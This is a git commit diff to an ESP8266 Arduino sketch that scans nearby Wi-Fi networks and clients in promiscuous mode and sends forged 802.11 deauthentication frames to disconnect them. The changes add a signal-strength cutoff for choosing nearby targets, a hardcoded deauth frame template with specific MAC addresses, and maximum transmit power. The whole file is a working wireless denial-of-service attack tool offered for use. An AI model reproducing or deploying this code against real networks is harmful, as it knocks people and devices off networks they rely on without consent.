120cfa69db8019aebfb34633d22abf9b7fd86cc2
Aknik <kinka@tutanota.de>
2017-07-16 18:54:10 +0200

    Update DeAuth.ino

--- DeAuth/DeAuth.ino
+++ DeAuth/DeAuth.ino
@@ -1,24 +1,24 @@
-// Expose Espressif SDK functionality - wrapped in ifdef so that it still
-// compiles on other platforms
-#ifdef ESP8266
-extern "C" {
-#include "user_interface.h"
-}
-#endif
-
 #include <ESP8266WiFi.h>
+
+extern "C" {
+  #include "user_interface.h"
+}
 
 #define ETH_MAC_LEN 6
 #define MAX_APS_TRACKED 100
 #define MAX_CLIENTS_TRACKED 200
 
-// Put Your devices here, system will skip them on deauth
+// Put Your devices here, system will skip them on deauth 2c:0e:3d:00:00:00
 #define WHITELIST_LENGTH 2
-uint8_t whitelist[WHITELIST_LENGTH][ETH_MAC_LEN] = { { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 }, {  0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF } };
+
+uint8_t whitelist[WHITELIST_LENGTH][ETH_MAC_LEN] = { { 0x2c, 0x0e, 0x3d, 0x00, 0x00, 0x01 }, {  0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF } };
 
 // Declare to whitelist STATIONs ONLY, otherwise STATIONs and APs can be whitelisted
 // If AP is whitelisted, all its clients become automatically whitelisted
-//#define WHITELIST_STATION 
+// #define WHITELIST_STATION 
+
+// Señal minima para atacar objetivo
+signed dBminimo = -69;
 
 // Channel to perform deauth
 uint8_t channel = 0;
@@ -27,7 +27,16 @@ uint8_t channel = 0;
 uint8_t packet_buffer[64];
 
 // DeAuth template
-uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};
+
+// uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};
+
+uint8_t template_da[26] = {
+0xc0, 0x00, 0x3a, 0x01, 
+0x1c, 0x56, 0xfe, 0x1b, 0xde, 0x50, 
+0xf8, 0xfb, 0x56, 0x2c, 0xb5, 0xef, 
+0xf8, 0xfb, 0x56, 0x2c, 0xb5, 0xef, 
+0x00, 0x00, 0x07, 0x00};
+
 
 uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
 uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
@@ -159,6 +168,7 @@ struct clientinfo parse_data(uint8_t *frame, uint16_t framelen, signed rssi, uns
       station = frame + 4;
       ap = frame + 4;
       break;
+
   }
 
   memcpy(ci.station, station, ETH_MAC_LEN);
@@ -179,12 +189,18 @@ int register_beacon(beaconinfo beacon)
       known = 1;
       break;
     }   // AP known => Set known flag
+
+    if ( beacon.rssi < dBminimo ) {
+       known = 1;
+       break;
+     }
+    
   }
-  if (! known)  // AP is NEW, copy MAC to array and return it
-  {
+    if (! known  )  // AP is NEW, copy MAC to array and return it
+  { 
     memcpy(&aps_known[aps_known_count], &beacon, sizeof(beacon));
     aps_known_count++;
-
+    
     if ((unsigned int) aps_known_count >=
         sizeof (aps_known) / sizeof (aps_known[0]) ) {
       Serial.printf("exceeded max aps_known\n");
@@ -203,6 +219,13 @@ int register_client(clientinfo ci)
       known = 1;
       break;
     }
+    
+     if ( ci.rssi < dBminimo ) {
+       known = 1;
+       break;
+     }
+
+    
   }
   if (! known)
   {
@@ -329,19 +352,20 @@ struct sniffer_buf2 {
 uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq)
 {
   int i = 0;
-
+  
   memcpy(buf, template_da, 26);
-  // Destination
+  // Destination 
   memcpy(buf + 4, c, ETH_MAC_LEN);
-  // Sender
+  // Sender 
   memcpy(buf + 10, ap, ETH_MAC_LEN);
-  // BSS
+  // BSS 
   memcpy(buf + 16, ap, ETH_MAC_LEN);
   // Seq_n
   buf[22] = seq % 0xFF;
   buf[23] = seq / 0xFF;
 
   return 26;
+  
 }
 
 /* Sends deauth packets. */
@@ -349,9 +373,12 @@ void deauth(uint8_t *c, uint8_t *ap, uint16_t seq)
 {
   uint8_t i = 0;
   uint16_t sz = 0;
+
   for (i = 0; i < 0x10; i++) {
     sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
+    //PrintHex8(packet_buffer,sz);
     wifi_send_pkt_freedom(packet_buffer, sz, 0);
+    
     delay(1);
   }
 }
@@ -365,21 +392,29 @@ void promisc_cb(uint8_t *buf, uint16_t len)
   } else if (len == 128) {
     struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
     struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
-    if (register_beacon(beacon) == 0) {
-      print_beacon(beacon);
-      nothing_new = 0;
+    if ( beacon.rssi > dBminimo ) { 
+    
+            if (register_beacon(beacon) == 0) {
+              print_beacon(beacon);
+              nothing_new = 0;
+                                              }
     }
+
+
+    
   } else {
     struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
     //Is data or QOS?
     if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) {
       struct clientinfo ci = parse_data(sniffer->buf, 36, sniffer->rx_ctrl.rssi, sniffer->rx_ctrl.channel);
-      if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN)) {
-        if (register_client(ci) == 0) {
-          print_client(ci);
-          nothing_new = 0;
-        }
-      }
+         
+                                  if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN)) {
+                                    if (register_client(ci) == 0) {
+                                      print_client(ci);
+                                      nothing_new = 0;
+                                    }
+                                  }
+                                  
     }
   }
 }
@@ -394,8 +429,12 @@ bool check_whitelist(uint8_t *macAdress){
 
 void setup() {
   Serial.begin(115200);
+  Serial.print("\n\n\n");
   Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());
-
+  Serial.print("\nMacAddress:");
+  Serial.println(WiFi.macAddress());
+  Serial.print("\n\n\n");
+  
   // Promiscuous works only with station mode
   wifi_set_opmode(STATION_MODE);
 
@@ -404,6 +443,9 @@ void setup() {
   wifi_promiscuous_enable(0);
   wifi_set_promiscuous_rx_cb(promisc_cb);
   wifi_promiscuous_enable(1);
+  system_phy_set_rfoption(1);
+  system_phy_set_max_tpw(82); // WiFi.setOutputPower(82);
+  
 }
 
 void loop() {
@@ -419,6 +461,7 @@ void loop() {
         wifi_promiscuous_enable(0);
         wifi_set_promiscuous_rx_cb(0);
         wifi_promiscuous_enable(1);
+        
         for (int ua = 0; ua < aps_known_count; ua++) {
           if (aps_known[ua].channel == channel) {
             for (int uc = 0; uc < clients_known_count; uc++) {
@@ -449,7 +492,7 @@ void loop() {
         wifi_promiscuous_enable(1);
 
         channel++;
-        if (channel == 15) break;
+        if (channel == 14) break;
         wifi_set_channel(channel);
       }
       delay(1);
@@ -464,3 +507,44 @@ void loop() {
   }
 }
 
+
+void PrintHex8(uint8_t *data, uint8_t length) // prints 8-bit data in hex
+{
+     char tmp[length*5+1];
+     byte first;
+     byte second;
+     for (int i=0; i<length; i++) {
+           first = (data[i] >> 4) & 0x0f;
+           second = data[i] & 0x0f;
+           // base for converting single digit numbers to ASCII is 48
+           // base for 10-16 to become upper-case characters A-F is 55
+           // note: difference is 7
+           tmp[i*5] = 48; // add leading 0
+           tmp[i*5+1] = 120; // add leading x
+           tmp[i*5+2] = first+48;
+           tmp[i*5+3] = second+48;
+           tmp[i*5+4] = 32; // add trailing space
+           if (first > 9) tmp[i*5+2] += 7;
+           if (second > 9) tmp[i*5+3] += 7;
+     }
+     tmp[length*5] = 0;
+     Serial.println(tmp);
+}
+
+
+void __attribute__((weak)) 
+user_rf_pre_init(void)
+{
+    // Warning: IF YOU DON'T KNOW WHAT YOU ARE DOING, DON'T TOUCH THESE CODE
+
+    // Control RF_CAL by esp_init_data_default.bin(0~127byte) 108 byte when wakeup
+    // Will low current
+    // system_phy_set_rfoption(0)；
+
+    // Process RF_CAL when wakeup.
+    // Will high current
+    system_phy_set_rfoption(1);
+
+    // Set Wi-Fi Tx Power, Unit: 0.25dBm, Range: [0, 82]
+    system_phy_set_max_tpw(82);
+}
